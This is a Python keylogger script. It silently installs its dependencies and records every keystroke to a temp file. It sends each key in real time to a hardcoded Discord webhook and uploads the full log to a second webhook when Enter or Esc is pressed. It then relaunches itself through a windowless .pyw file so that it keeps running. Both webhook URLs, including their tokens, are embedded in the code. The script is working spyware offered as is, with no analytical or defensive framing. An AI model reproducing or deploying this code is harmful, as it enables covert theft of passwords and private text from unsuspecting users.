import time
import os

try:
	import pynput
	import requests
	from pynput.keyboard import Key, Listener
except:
	os.system('pip install pynput')
	os.system('pip install requests')
	import pynput
	import requests
finally:
	import pynput
	import requests
	from pynput.keyboard import Key, Listener

def restartAPP():
	print(os.getcwd())
	# os.startfile("kl_r.py")
	os.startfile("kl_d.pyw")

keys = []
logPATH = os.getenv('TEMP') + '\\log.txt'
hookURL = 'https://discord.com/api/webhooks/959791476273991680/hqyCHOE9nMN13IGEbIwaGBKzfAt7QcZ_cG3B1goHQ-9K_CXaurGRPEV1EloMiXeiFZUV' # LIVE
escHOOK = 'https://discord.com/api/webhooks/959791611775156254/ud9e0MuIqNh49zzW_AXwJDCMWNAjr_osO_feogBnaRpnqvYqIJ6JZ83sG33jYs_FibqE' # ESC

def sendHOOK(letter, uri):
	bot = {"content": letter,
			"username": str(int(time.time())),
			"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959791245339787274/unknown.png',
			"tts": "false"}
	response = requests.post(uri, json=bot)
	pass

def on_press(key):
	
	keys.append(key)
	write_file(keys)
	
	try:
		print('alphanumeric key {0} pressed'.format(key.char))
		sendHOOK(key.char, hookURL)
	except AttributeError:
		print('special key {0} pressed'.format(key))
		sendHOOK(str(key), hookURL)

	if key == Key.esc or key == Key.enter:
		# Stop listener
		with open(logPATH) as f:
			contents = f.read()
			print("\n\n\n\n" + contents)
		sendHOOK("```\n" + contents + "\n```", escHOOK)
		restartAPP()
		return False
		
def write_file(keys):
	
	with open(logPATH, 'w') as f:
		for key in keys:
			
			# removing ''
			k = str(key).replace("'", "")
			f.write(k)
					
			# explicitly adding a space after
			# every keystroke for readability
			f.write(' ')

def on_release(key):
					
	print('{0} released'.format(key))
	# if key == Key.esc:
	# 	# Stop listener
	# 	with open(logPATH) as f:
	# 		contents = f.read()
	# 		print("\n\n\n\n" + contents)
	# 	sendHOOK("```\n" + contents + "\n```", escHOOK)
	# 	return False


with Listener(on_press = on_press,
			on_release = on_release) as listener:
					
	listener.join()
